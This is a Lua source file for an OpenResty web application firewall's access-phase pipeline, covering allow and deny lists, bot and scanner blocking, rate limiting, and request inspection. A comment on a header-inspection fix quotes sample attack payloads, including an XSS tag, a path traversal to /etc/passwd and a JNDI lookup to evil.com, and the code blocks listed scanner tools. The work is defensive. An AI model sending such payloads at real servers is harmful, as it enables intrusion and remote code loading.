-- WAF 入口：access 阶段主流程
-- 1. 白名单命中 -> 放行并跳过检测
-- 2. 黑名单命中 -> 执行动作（deny/log）
-- 3. 检测流水线（语义引擎）扫描 URI 与参数
-- 4. 事件异步落盘
local config = require("waf.config")
local rules = require("waf.rules")
local semantic = require("waf.semantic")
local waflog = require("waf.waflog")
local normalize = require("waf.normalize")
local cc = require("waf.cc")
local challenge = require("waf.challenge")
local bot = require("waf.bot")
local smug = require("waf.smug")
local websocket = require("waf.websocket")
local probe = require("waf.probe")
local iplist = require("waf.iplist")

local ngx_say = ngx.say
local ngx_exit = ngx.exit
local rules_started = false

local function client_ip()
    -- OpenResty 是受保护站点的流量入口。未经 real_ip 模块可信代理校验的
    -- X-Forwarded-For 可由客户端伪造，因此日志与规则统一使用 remote_addr。
    return ngx.var.remote_addr or ""
end

local function deny(attack_type, rule, detail)
    ngx.status = 403
    ngx.header.content_type = "text/html; charset=utf-8"
    ngx_say("<html><body><h1>403 Forbidden</h1><p>Blocked by 3panel WAF</p></body></html>")
    return ngx_exit(403)
end

local function log_event(action, layer, attack_type, rule, detail, start_ms, body)
    -- emit 只写共享内存队列，不涉及 IO；这里不再 pcall（见文件头说明）。
    local now_ms = ngx.now() * 1000
    local request_start_ms = ngx.req.start_time and ngx.req.start_time() * 1000 or now_ms
    waflog.emit({
        websiteId = config.get_site_id(),
        ruleId = rule and rule.id or "",
        ruleName = rule and rule.name or "",
        layer = layer,
        attackType = attack_type or "",
        action = action,
        method = ngx.req.get_method(),
        path = ngx.var.uri or "",
        query = config.sanitize_log_value(ngx.var.query_string),
        ip = client_ip(),
        userAgent = config.sanitize_log_value(ngx.var.http_user_agent),
        detail = config.sanitize_log_value(detail),
        requestBody = config.sanitize_log_value(body),
        durationMs = math.floor((now_ms - request_start_ms) * 100) / 100,
    })
end

local function detect_request(start_ms)
    -- URI 检测（含规范化后的路径穿越检测）
    local uri = ngx.var.request_uri or ""
    local hit = semantic.inspect(uri, uri)
    if hit then
        return hit.type, hit.value
    end
    -- 参数检测：GET args
    local ok, params = pcall(ngx.req.get_uri_args, 100)
    if ok and params then
        for k, vs in pairs(params) do
            local vals = type(vs) == "table" and vs or {vs}
            for _, v in ipairs(vals) do
                if type(v) == "string" then
                    local h = semantic.inspect(v, uri)
                    if h then
                        return h.type, k .. "=" .. v
                    end
                end
            end
        end
    end
    -- 请求体（仅 application/x-www-form-urlencoded / json，且不超过阈值）
    --
    -- 命中的请求体要作为第三个返回值交给日志：只有 URI/参数命中时日志里的
    -- requestBody 天然为空，但 POST 命中时它是唯一的取证材料。之前 body 只是
    -- 局部变量，日志恒为空，展开详情永远看不到请求内容。
    local ct = ngx.var.content_type or ""
    local cl = tonumber(ngx.var.content_length) or 0
    if cl > 0 and cl <= config.BODY_LIMIT and (ct:find("urlencoded", 1, true) or ct:find("json", 1, true) or ct:find("multipart", 1, true)) then
        ngx.req.read_body()
        local body = ngx.req.get_body_data()
        if body then
            if ct:find("multipart", 1, true) and semantic.detect_upload(body) then
                return "upload", "dangerous file upload", body
            end
            local h = semantic.inspect(body, uri)
            if h then
                return h.type, h.value, body
            end
        end
    end
    return nil
end

-- ============ 请求头语义检测 ============
--
-- 背景：语义引擎此前只扫 URI / query args / body，**请求头完全不在检测范围内**。
-- waf-detector 的 va2 行为分析报 `header 0% [UNPROTECTED]`，内侧独立复测确认：
-- `X-Injected: <script>alert(1)</script>`、`Referer: .../../../etc/passwd`、
-- `X-Custom: ${jndi:ldap://evil.com}` 全部 200 放行。这条不是误报，是真实缺口。
--
-- 为什么不用 ngx.req.get_headers() 全量遍历：它会为每个请求分配完整头表，
-- 而绝大多数请求头是无害的标准头。改为只挑"用户自定义/可注入"的头，
-- 命中名单里的头名才做语义检测 —— 白名单式采样，零分配常态路径。
--
-- 刻意跳过的头：
--   host / content-length / connection / user-agent / referer 之外的
--   accept-*(协商类，攻击者塞不进可执行语义)、cache-control 等
--   Host  由 server_name 匹配，不做语义检测（它不是注入载体）
--   Referer 单独处理：路径型穿越要查，query 型注入交给通用语义即可
local INSPECTABLE_HEADERS = {
    "x_forwarded_for", "x_forwarded_host", "x_forwarded_proto", "x_forwarded_port",
    "x_real_ip", "x_originating_ip", "x_client_ip", "x_custom",
    "x_http_method_override", "x_method_override", "x_http_host",
    "x_attack", "x_payload", "x_injected", "x_input", "x_test",
    "x_api_key", "x_token", "x_auth_token",
    "accept_language", "referer",
}

-- 归一化头名：X-Forwarded-For -> x_forwarded_for
local function norm_header(k)
    return (string.lower(string.gsub(k, "%-", "_")))
end

-- 单个头值的语义检测。返回命中类型或 nil。
-- 用 pcall 兜住不可预见的输入形态（头值可能是 table 表示多值）。
local function inspect_header(k, v)
    if type(v) == "table" then
        for _, item in ipairs(v) do
            local hit = inspect_header(k, item)
            if hit then return hit end
        end
        return nil
    end
    if type(v) ~= "string" or v == "" or #v > 8192 then
        return nil
    end
    local ok, res = pcall(semantic.inspect, v, nil)
    if not ok or not res then
        return nil
    end
    return res.type .. " in header:" .. k
end

local function inspect_headers()
    local headers, err = ngx.req.get_headers(100)
    if not headers then
        return nil
    end
    -- 先按名字过滤，再取值：只有命中可检测名单的头才做字符串处理
    for k, v in pairs(headers) do
        local nk = norm_header(k)
        for _, want in ipairs(INSPECTABLE_HEADERS) do
            if nk == want then
                local hit = inspect_header(k, v)
                if hit then
                    return hit
                end
                break
            end
        end
    end
    return nil
end

-- ============ 主流程 ============
local function access_main()
    -- Request timing is read only when an event is actually logged. Calling
    -- ngx.now() for every clean request is measurable at high QPS.
    local start_ms = nil

    -- The directive stays installed after first enablement. Daily enable/disable is
    -- a rules.json data-plane switch, so toggling one site needs no nginx reload.
    -- Do not wrap the complete hot path in pcall: LuaJIT cannot compile across
    -- that boundary. Individual parsers still validate untrusted data.
    if not rules_started then
        rules.start_refresh()
        rules_started = true
    end
    local state = rules.get_site_state_cached(ngx.var.waf_site_id)
    if not state or (state.site and state.site.enabled == false) then
        return
    end

    -- 1. 名单引擎
    local res
    if rules.has_rules(state) then
        res = rules.check(state)
    end
    if res then
        if res.action == "allow" then
            return -- 白名单：直接放行，跳过所有检测
        elseif res.action == "deny" then
            log_event("deny", "rules", "blacklist", res.rule, "hit blacklist rule", start_ms)
            return deny()
        elseif res.action == "challenge" then
            log_event("challenge", "rules", "blacklist", res.rule, "hit challenge rule", start_ms)
            return challenge.respond()
        elseif res.action == "log" then
            log_event("log", "rules", "blacklist", res.rule, "hit monitor rule", start_ms)
            -- 仅记录，不拦截
        end
    end

    -- 1.5 订阅 IP 黑名单
    --
    -- 位置关键：排在名单引擎之后 —— 用户的 allow 规则一旦命中就已在上面
    -- return 了，订阅名单永远看不到它。这是误伤用户的唯一自救通道，
    -- 顺序颠倒等于把它堵死。
    --
    -- 必须读 ipListEnabled 开关：关闭订阅后要完全跳过这一段，
    -- 否则「关闭」只是界面上的摆设，用户关了却照拦。
    --
    -- 名单未下载 / 解析失败时 in_list 返回 false（不拦截），而不是报错：
    -- 没有名单只是不拦这一层，不能因此打挂站点。
    if state.global_iplist_enabled then
    local in_blacklist = iplist.in_list(client_ip())
    if in_blacklist then
        log_event("deny", "subscription", "ip_blacklist", nil, "source ip in subscription blocklist", start_ms)
        return deny("ip_blacklist")
    end
    end

    -- 2. 机器人识别（善意 bot 放行等同白名单；扫描器指纹拦截）
    --
    -- 扫描器指纹默认就拦，不受 bot 开关控制。理由：
    --   · sqlmap / nikto / Burp / Nessus 的 UA 是明确的攻击工具标识，
    --     正常访客不会用它们访问站点，拦它没有任何误伤风险；
    --   · 它是 panel 上一个独立开关（waf_options.bot_enabled），一旦用户没开，
    --     扫描器防护就整体消失 —— 而这恰恰是最该默认生效的一层。
    -- 善意 bot 的"放行"仍然受 allowGoodBots 控制：那关系到搜索引擎收录，
    -- 误伤代价真实存在，不能默认放行。
    local bot_conf = state.site and state.site.bot
    if bot_conf then
        local bot_verdict = bot.check(bot_conf)
        if bot_verdict == "good" then
            return -- 善意 bot 直接放行，跳过检测
        elseif bot_verdict == "bad" then
            log_event("deny", "bot", "scanner", nil, "blocked scanner user-agent", start_ms)
            return deny()
        end
    else
        -- 未配置 bot：仍拦扫描器 UA，只是不放行任何"善意 bot"
        local kind = bot.classify(ngx.var.http_user_agent)
        if kind == "bad" then
            log_event("deny", "bot", "scanner", nil,
                "blocked scanner user-agent (bot module not configured)", start_ms)
            return deny()
        end
    end

    -- 3. CC 防护（挑战已通过的请求直接放行）
    local cc_conf = state.site and state.site.cc
    if cc_conf and not challenge.passed() then
        local verdict = cc.check(cc_conf)
        if verdict == "deny" then
            log_event("deny", "cc", "cc", nil, "rate limit exceeded", start_ms)
            return deny()
        elseif verdict == "challenge" then
            log_event("challenge", "cc", "cc", nil, "rate limit, issuing js challenge", start_ms)
            return challenge.respond()
        elseif verdict == "log" then
            log_event("log", "cc", "cc", nil, "rate limit (monitor)", start_ms)
        end
    end

    -- 5. 扫描器行为指纹（URI 多样性 / 速率突增）
    local probe_conf = state.site and state.site.probe
    local probe_hit = nil
    if probe_conf then probe_hit = probe.check(probe_conf) end
    if probe_hit then
        log_event("deny", "probe", "scanner", nil, probe_hit, start_ms)
        return deny()
    end

    -- Common static/page GET: after policy checks, inspect the URI once and avoid
    -- allocating the complete header/argument tables when the request has no
    -- query string, body, Content-Length, or Transfer-Encoding.
    --
    -- 注意：这条快速路径只在"确实没有请求头可查"时提前返回。
    -- 原实现无条件 return，导致带自定义头的请求（X-Custom / X-Forwarded-Host 等）
    -- 完全绕过语义检测 —— 攻击者只要把载荷放进 header、把 URL 保持干净即可绕过，
    -- 这正是 waf-detector 报 header 0% UNPROTECTED 的根因。
    -- 现在改为：先扫可注入头，有命中就拦；没命中才允许走快速路径。
    local header_hit = inspect_headers()
    if header_hit then
        log_event("deny", "semantic", "header_injection", nil, header_hit, start_ms)
        return deny("header_injection")
    end

    -- WebSocket 升级请求：必须放在下面的 GET 快速路径**之前**。
    -- 握手请求是 GET、没有 query string、没有 body，正好会命中
    -- "not query_string and not content_length" 的条件并被直接 return 跳过 ——
    -- 而 WebSocket 应用里握手 URL 带参数是常态（?token=...&room=...）。
    -- 所以这里单独检出升级请求做一次完整检查，不依赖通用流水线。
    if websocket.is_upgrade() then
        local uri = ngx.var.request_uri or ""
        local ws_hit = websocket.inspect_handshake(semantic, uri)
        if ws_hit then
            log_event("deny", "websocket", "websocket_injection", nil, ws_hit, start_ms)
            return deny("websocket_injection")
        end
    end

    if ngx.req.get_method() == "GET"
        and not ngx.var.query_string
        and not ngx.var.content_length
        and not ngx.var.http_transfer_encoding then
        local uri = ngx.var.request_uri or ""
        local fast_hit = semantic.inspect_uri(uri)
        if fast_hit then
            log_event("deny", "semantic", fast_hit.type, nil, fast_hit.value, start_ms)
            return deny(fast_hit.type)
        else
            return
        end
    end

    -- 6. HTTP 请求走私检测（在语义检测前，畸形请求不进流水线）
    local smug_hit = smug.detect()
    if smug_hit then
        log_event("deny", "smuggling", "smuggling", nil, smug_hit, start_ms)
        return deny()
    end

    -- 7. 语义检测
    -- 请求头已在快速路径之前扫过（inspect_headers），此处只处理 URI / 参数 / body。
    -- abody 是命中的请求体（仅 POST 命中时有值），要交给日志留证。
    local atype, adetail, abody = detect_request(start_ms)
    if atype then
        log_event("deny", "semantic", atype, nil, adetail, start_ms, abody)
        return deny(atype)
    end
end

-- When loaded through require(), keep the fully constructed engine in
-- package.loaded so LuaJIT can compile the hot function across requests.
-- Direct execution is retained for upgrades where an existing site still
-- points at access.lua until its OpenResty configuration is refreshed.
if ... == "waf.access" then
    return { run = access_main }
end
access_main()
